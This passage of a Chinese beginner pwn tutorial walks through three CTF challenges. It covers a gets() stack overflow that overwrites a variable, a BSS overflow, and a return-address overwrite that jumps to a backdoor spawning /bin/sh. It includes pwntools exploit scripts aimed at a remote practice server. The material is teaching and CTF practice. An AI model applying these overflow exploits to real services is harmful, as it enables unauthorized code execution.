[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_789_/t012dc2ff70c0b2d28e.png)

[![](https://p2.ssl.qhimg.com/dm/1024_642_/t01c7840e14ad595cd6.jpg)](https://p2.ssl.qhimg.com/dm/1024_642_/t01c7840e14ad595cd6.jpg)

我们可以利用`pwndpg`插件很清楚的看到堆栈信息

我们输入`n`程序执行到下一行 (`n -&gt;next`不进入函数 `s-&gt;step` 进入函数 )

[![](https://p4.ssl.qhimg.com/dm/1024_498_/t010048950343a15ce7.jpg)](https://p4.ssl.qhimg.com/dm/1024_498_/t010048950343a15ce7.jpg)

接着,左边直接找main函数,然后f5,得到代码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_707_/t01a176466f10b798ec.png)

这代码逻辑其实很容易看懂，就是一开始`v5`不能等于1926进入else流程的时候,`v5`等于1926就能输出flag

作为一枚pwn萌新,其实感觉还是有点不可思议的,但是转头想想栈溢出覆盖值的概念,就觉得可以理解了。

我们注意下`else`流程哪里，有个`gets(&amp;v4)` 是char类型的,很明显不对劲嘛,`gets`应该读取的是字符串类型

这样我就可以输入无数个字符,这样可能就会导致栈溢出。

然后我们想想,我们可不可以控制`v4`让其溢出去覆盖`v5`的值呢,下面看我操作吧。

我们首先需要确认下`v4`和`v5`的位置

ida反编译直接双击或者鼠标点到`v4` `v5`可以看到相对esp ebp的位置

> <p>v4 rsp+0h rbp-20h<br>
v5 rsp+8h rbp-18h</p>

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_574_/t0148274a7574f972d3.jpg)

所以说我们可以直接写exp了。

```
#!/usr/bin/python
# -*- coding:utf-8 -*-

from pwn import *
c = remote('111.198.29.45', '52808')
c.sendlineafter('Birth?', '1999')
c.sendlineafter('Name?','A'*8 + p64(1926))
c.interactive()
```

其实画个图很好理解

[![](https://p1.ssl.qhimg.com/t01e49830c69a87f8bf.jpg)](https://p1.ssl.qhimg.com/t01e49830c69a87f8bf.jpg)

这里因为不需要栈越界所以`canary`保护就没啥用了,如果栈越界的话,那么就会导致canary存的值发生改变,然后比较改变之后程序就会执行`__stack_chk_fail`函数,从而终止程序,后面遇到bypass cannary保护我再继续深究下具体流程,目前我们还是继续刷题,巩固下前面的知识先。

#### <a class="reference-link" name="(3)%20%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"></a>(3) 参考链接

[Canary保护详解和常用Bypass手段](https://www.anquanke.com/post/id/177832)

[Bit,Byte,Word,Dword,Qword](https://www.cnblogs.com/silva/archive/2009/12/08/1619393.html)

[手把手教你栈溢出从入门到放弃](https://paper.seebug.org/271/)

[gdb查看函数调用栈](https://blog.csdn.net/baidu_24256693/article/details/47297209)

[手把手教你玩转GDB(一)——牛刀小试：启动GDB开始调试](http://www.wuzesheng.com/?p=1327)

### <a class="reference-link" name="0x4%20hello_pwn"></a>0x4 hello_pwn

#### <a class="reference-link" name="(1)%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E5%8F%8A%E5%85%B6%E8%80%83%E7%82%B9"></a>(1)题目描述及其考点

> <p>pwn！，segment fault！菜鸡陷入了深思<br>
考点: bss段溢出</p>

#### <a class="reference-link" name="(4)wp"></a>(4)wp

我们首先把文件下载下来,`checksec`一下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_203_/t01c8f58e660da84d98.jpg)

还是老套路找入口函数`main`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_290_/t01f92d49de7a2e2bff.jpg)

然后我会直接双击`sub_400686`查看下函数内容.

[![](https://p4.ssl.qhimg.com/t014e314bf258cebd1b.jpg)](https://p4.ssl.qhimg.com/t014e314bf258cebd1b.jpg)

这样就很容易明白我们的目标是让等式成立。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](PWN%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97(%E4%B8%80).assets/image-20191006222315601.png#alt=image-20191006222315601)

我们可以通过`read`控制`unk_601068` 10个字节。

这里涉及到`bss`段的概念

> <p>bss段主要存放未初始化的全局变量<br>
可以看到上面两个变量都是没有进行初始化的。<br>
bss段数据是向高地址增长的,所以说低地址数据可以覆盖高地址数据</p>

所以我们可以直接写出exp了 两者之间的相差4个字节 `0x6B-0x68=0x4`,我们还可0x10-0x4=12字节,

写入`1853186401`=`0x6E756161`小于int范围4字节足矣

```
#!/usr/bin/python
# -*- coding:utf-8 -*-

from pwn import *
ip, port = '111.198.29.45:44975'.split(':')
# print(ip, port)
c = remote(ip, port)
#接收完这个数据之后再发送.其实不要也行,得看服务端处理速度
c.recvuntil("lets get helloworld for bof") 
c.sendline('A'*4 + p64(1853186401))
c.interactive()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_266_/t010e4c21e08f726c0c.jpg)

#### <a class="reference-link" name="0x3%20%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"></a>0x3 参考链接

<a>BSS段的溢出攻击</a>

[Heap/BSS 溢出机理分析[转]](https://www.cnblogs.com/belie8/archive/2012/02/23/2365281.html)

### <a class="reference-link" name="0x5%20level0"></a>0x5 level0

#### <a class="reference-link" name="(1)%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E5%8F%8A%E5%85%B6%E8%80%83%E7%82%B9"></a>(1)题目描述及其考点

> <p>菜鸡了解了什么是溢出，他相信自己能得到shell<br>
考点: 栈溢出 **return2libc**</p>

这个题目很经典的栈溢出漏洞利用,通过栈溢出来覆盖返回地址,从而调用恶意函数地址。

而且这个漏洞代码非常简洁,很适合新手去学习。

#### <a class="reference-link" name="(2)wp"></a>(2)wp

第一步套路看保护:

[![](https://p2.ssl.qhimg.com/dm/1024_214_/t010f09122bd7bc9599.jpg)](https://p2.ssl.qhimg.com/dm/1024_214_/t010f09122bd7bc9599.jpg)

第二步ida搜索入口函数

[![](https://p0.ssl.qhimg.com/dm/1024_200_/t01dacfe2c6589688bb.jpg)](https://p0.ssl.qhimg.com/dm/1024_200_/t01dacfe2c6589688bb.jpg)

看到`vulnerable_function`,显然是个提示。

然后看下函数的代码是啥:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a9e6dff995e5fef8.jpg)

然后我们`shift+f12`看下字符串

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_460_/t01c8b977fbe615f68c.jpg)

发现有个`/bin/sh`,

通过xref确定了后门函数:

[![](https://p5.ssl.qhimg.com/dm/1024_172_/t01ad5698486f459c70.jpg)](https://p5.ssl.qhimg.com/dm/1024_172_/t01ad5698486f459c70.jpg)

[![](https://p0.ssl.qhimg.com/dm/1024_530_/t01cc7e97af9fddaa77.jpg)](https://p0.ssl.qhimg.com/dm/1024_530_/t01cc7e97af9fddaa77.jpg)

所以说如果我们能调用这个函数就可以反弹一个shell了。

这个时候基本就可以猜到是栈溢出了覆盖函数返回地址。

我们具体来分析下:

首先我们查看下`write` and `read`函数的文档说明:

> <p>read(int fd,void <em>buf,size_t nbyte)<br>
ssize_t write(int fd,const void </em>buf,size_t nbytes)<br>
fd是文件描述符 0是标准输入 1是标准输出<br>
其实很好理解,第一个函数往1里面写入了`hello world`,因为1对应的标准输出对象是屏幕,所以就会在屏幕上输出helloworld，就是一个printf的功能。<br>
同理read也是这样,我们直接在屏幕输入的数据就会被读取到buf里面。</p>

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_227_/t0147446de89b82ffaa.jpg)

这个题目没开`pie`,也就是地址其实就是固定的,所以我们先确定下那个shell函数的地址(函数开始地址): `0000000000400596`

我们继续分析下`read`的问题:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](PWN%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97(%E4%B8%80).assets/image-20191007075530589.png#alt=image-20191007075530589)

这里`buf`应该是`char`类型1字节大小,但是读取的时候竟然可以写入0x200的数据,这里的栈大小是`0x80`字节

那个`0x80`怎么算的呢

> <p>rsp+0h 说明这个位置其实就是rsp的位置<br>
rbp-80h 说明rbp距离rsp是0x80h,那么栈的大小不就是rbp-rsp=+0x80大小吗?</p>

这样我们就可以考虑覆盖read函数的返回地址了。

我们可以画个草图,然后用gdb去调试下这个流程就很容易明白覆盖过程了。

这个题目涉及到一个完整的函数调用流程,这里为了照顾跟我一样的萌新,我再细细地继续从0基础说一次。

重新回顾下:

> <p>ebp 作用就是存储当前函数的基地址,运行时保持不变,用来索引函数参数或者局部变量的位置<br>
esp 用来存储函数调用栈顶地址，在压栈是地址减少，退栈是地址增大<br>
eip 指向程序下一条执行指令。</p>

我们简化下概念:<br>
假设有函数A 函数B

函数A在第二行调用了函数B,也就是说第一行的时候eip指向的就是执行第二行的指令的地址。

```
int function A()
`{`
  B();
  printf("123");
`}`
```

那么调用完B之后,eip怎么去指向`printf`函数去执行呢,这里就是函数调用栈的关键啦。

首先我们要明确,栈空间是在当前空间开辟的一个独立空间,而且增长方式与当前空间是相反的。

有了这个概念之后,我们继续分析。

假设第三条指令地址(printf函数)是0x3,也就是说B函数执行完之后,eip应该执行0x3

那么执行第二条指令开辟的栈的流程就是:

> 保护现场

首先把0x3 eip信息压入栈内,保留了eip程序执行流程的信息。

然后把当前ebp寄存器的值(调用函数A的基地址)压入栈内,然后更将ebp寄存器的值更新为当前栈顶的地址。

这样调用函数A的ebp信息可以得到保存,同时ebp被更新为被调用函数b的ebp地址。

> 恢复现场

首先pop ebp,然后恢复了调用函数A时候的ebp。

然后pop eip 退出栈,恢复之前的下一条eip指令

可能有些人就在想为啥要这样做? eip不变不行吗,为啥要入栈作为返回地址存存起来,这里有个小误区,首先在栈空间里也是需要eip的,所以说栈空间的指令执行的时候eip会发生改变,不作为返回地址存起来的话,那么就会丢失程序流程。

理解之后我们画个堆栈图来理解这个题目

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c4b5886669a3a4f9.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_265_/t01a60216b096fe0d74.jpg)

这里是开辟了0x80的栈空间

看下地址:

[![](https://p1.ssl.qhimg.com/dm/1024_42_/t017a38534332ec7d5d.jpg)](https://p1.ssl.qhimg.com/dm/1024_42_/t017a38534332ec7d5d.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f01d37c4532acca7.jpg)

`0xf0-0x70=0x80`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_203_/t01e528c163154462f2.jpg)

可以看到数据的增长方向(内存地址是随机化的,每次启动都不同)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_209_/t01a93c03e1ca93ce11.jpg)

如果再继续输入的话,就会把ebp给覆盖了。

我们直接可以写exp了。 因为rbp是占用8字节64位寄存器,0x80+0x8=0x88(覆盖rbp之后继续添加数据就覆盖返回地址了)

```
#!/usr/bin/python
# -*- coding:utf-8 -*-

from pwn import *
ip, port = '111.198.29.45:37260'.split(':')
# print(ip, port)
c = remote(ip, port)
# c.recvuntil("lets get helloworld for bof")
# p64是小端字节序转换
c.sendline('A'*0x88 + p64(0x400596))
c.interactive()
```

[![](https://p5.ssl.qhimg.com/dm/1024_429_/t01469fd669b800cc0d.jpg)](https://p5.ssl.qhimg.com/dm/1024_429_/t01469fd669b800cc0d.jpg)



## 0x6 总结

因为自己也是一个萌新,所以文章难免有疏漏或者错误的地方,欢迎师傅给我订正。对于网上的pwn教程我个人觉得对新手真的不是特别友好，造成了pwn入门门槛偏高，希望自己能给一些新手带来一些帮助，也希望有师傅能带带我这个pwn萌新谢谢。 还有。。后面我会花时间填好之前那个java代码审计入门教程的坑的。。。不过还是得先准备下老师的考试。。。。。。我会尽快的。。emmmm。



## 0x7 预期计划

由于自己学的比较零碎,后面还是通过继续做题,最后再来个总结的方式,记录下自己的学习过程。



## 0x8 参考链接

[Linux – Pwn 从入门到放弃](https://www.n0tr00t.com/2017/12/15/Linux-Pwn-Rumen~Fangqi.html)
